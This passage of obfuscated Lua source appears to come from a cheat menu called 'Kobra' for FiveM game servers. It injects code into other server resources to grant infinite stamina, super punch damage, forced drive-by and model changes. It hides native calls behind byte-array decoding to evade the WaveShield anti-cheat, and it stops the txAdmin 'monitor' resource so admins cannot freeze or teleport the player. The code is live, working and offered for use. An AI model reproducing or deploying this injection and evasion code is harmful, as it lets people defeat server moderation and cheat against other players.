                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v394) if v394 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v395) if v395 then local v627=458 -(337 + 121) ;while true do if (0==v627) then v12:Notify("success","Kobra","Infinite Stamina On",8790 -5790 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end break;end end else local v628=0 -0 ;while true do if (v628==(1911 -(1261 + 650))) then v12:Notify("error","Kobra","Infinite Stamina Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end break;end end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v396) local v397=0 -0 ;local v398;while true do if (v397==0) then v398=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v396 then v48(v398,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v48(v398,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end break;end end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v399) local v400=GetResourceState("WaveShield")=="started" ;local v401=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v399 then if v400 then v12:Notify("success","Kobra","Super Punch Enabled",4817 -(772 + 1045) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);else v48(v401,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",424 + 2576 );end elseif v400 then v12:Notify("error","Kobra","Super Punch Disabled",3144 -(102 + 42) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);else local v780=0;while true do if (v780==0) then v48(v401,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",4844 -(1524 + 320) );break;end end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v402) if v402 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v403) if v403 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(159 -(18 + 138) ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(7 -4 ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v404) if v404 then MachoResourceStop("monitor");print("started");else local v629=0;while true do if (v629==(348 -(136 + 212))) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v405) if v405 then local v630=0;while true do if (v630==(0 + 0)) then MachoResourceStop("monitor");print("started");break;end end else print("stopped");MachoResourceStart("monitor");end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v406) if v406 then local v631=0;while true do if (v631==(1604 -(240 + 1364))) then MachoResourceStop("monitor");print("started");break;end end else local v632=1082 -(1050 + 32) ;while true do if (v632==0) then print("stopped");MachoResourceStart("monitor");break;end end end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1 + 0 ,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v407) if (v407=="Random") then v48("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1 + 0 ,values={"Freemode Male","Freemode Female"},onSelect=function(v408) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v408));end},{type="scrollable",label="Peds",scrollType="onEnter",value=726 -(267 + 458) ,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v409) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v409));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=1 + 0 ,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v410) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(v410));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v411=0;local v412;while true do if (v411==1) then if v412 then local v848=GetPlayerFromServerId(v412);if ((v848== -1) or  not DoesEntityExist(GetPlayerPed(v848))) then local v975=0 + 0 ;while true do if (v975==1) then v12:UpdateListMenu();return;end if (v975==(1664 -(674 + 990))) then v268:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",3000);v27[v412]=nil;v975=1 + 0 ;end end end local v849=GetPlayerPed(v848);local v850=GetEntityCoords(v849);local v851=GetEntityHeading(v849);SetEntityCoords(PlayerPedId(),v850.x,v850.y,v850.z,false,false,false,false);SetEntityHeading(PlayerPedId(),v851);v268:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v412)),v412),1228 + 1772 );else v268:Notify("error","Kobra","You must select a player to do this!",4755 -1755 );end break;end if (v411==(1055 -(507 + 548))) then v412=nil;for v781,v782 in pairs(v27) do if v782 then v412=v781;break;end end v411=1;end end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v413) local v414=nil;for v569,v570 in pairs(v27) do if v570 then v414=v569;break;end end v268:HandleSpectateToggle(v414,v413);end},{type="button",label="Copy 